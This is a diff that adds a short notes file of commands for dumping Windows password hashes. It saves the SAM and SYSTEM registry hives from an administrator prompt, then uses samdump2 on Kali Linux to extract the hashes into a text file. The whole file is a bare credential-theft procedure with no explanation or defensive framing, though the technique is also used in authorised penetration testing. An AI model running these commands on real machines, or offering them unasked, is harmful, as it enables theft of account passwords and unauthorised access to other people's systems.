@@ -1,0 +1,7 @@
+open cmd with administrator
+reg save HKLM\SAM C:\sam
+reg save HKLM\SYSTEM C:\system
+
+kali linux
+sudo apt install samdump2
+samdump2 SYSTEM SAM > hashes.txt
